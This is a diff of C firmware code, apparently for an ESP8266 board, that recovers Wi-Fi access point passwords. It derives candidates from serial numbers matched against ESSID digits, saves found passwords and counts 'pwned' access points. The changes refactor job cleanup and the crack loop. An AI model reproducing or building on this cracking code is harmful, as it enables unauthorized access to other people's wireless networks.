@@ -213,6 +213,7 @@ static void blink(void *arg){
 ICACHE_FLASH_ATTR
 static void free_job(crack_job_t * job){
     if(job){
+        delete_cracker_job(job);
         delete_finished_job(job);
         os_free(job->candidate_passwords);
         os_free(job);
@@ -347,7 +348,6 @@ static void wifi(os_event_t *events){
                         printf("Found valid password for %s: %s\n", aps[global_ap_to_test].essid, aps[global_ap_to_test].password);
                         save_password(global_ap_to_test);
                         os_timer_arm(&blink_timer, 50, 1);
-                        delete_cracker_job(aps[global_ap_to_test].job);
                         free_job(aps[global_ap_to_test].job);
                         aps[global_ap_to_test].job = NULL;
                         total_aps_pwned++;
@@ -609,20 +609,12 @@ static void crack(os_event_t *events){
         // local loop copy of sum
         uint64_t lsum = sum;
 
-        // Fetch list of jobs to process
-        crack_job_t jobs[MAX_CRACK_JOBS];
-        size_t jobs_to_check = jobs_running;
-        for(size_t jobs_idx = 0; jobs_idx < jobs_to_check; jobs_idx++){
-            memcpy(&jobs[jobs_idx], jobs_running_queue[jobs_idx], sizeof(crack_job_t));
-        }
-
         // Check serials
         for(buf[2] = 0; buf[2] < MAX2+1; buf[2]++, lsum++){
             const uint32_t essid_digits = (lsum - (((lsum * MAGIC2) >> 54) - (lsum >> 31)) * 10000000);
             // check results
-            for(size_t jobs_idx = 0; jobs_idx < jobs_to_check; jobs_idx++){
-                if(essid_digits == jobs[jobs_idx].target){
-                    // Get a reference to the queue (not the copy) and update it
+            for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
+                if(essid_digits == jobs_running_queue[jobs_idx]->target){
                     crack_job_t * restrict job = jobs_running_queue[jobs_idx];
                     const size_t required_size = PASSWORD_SIZE*(job->passwords_found+TESTED_PREFIXES);
                     job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
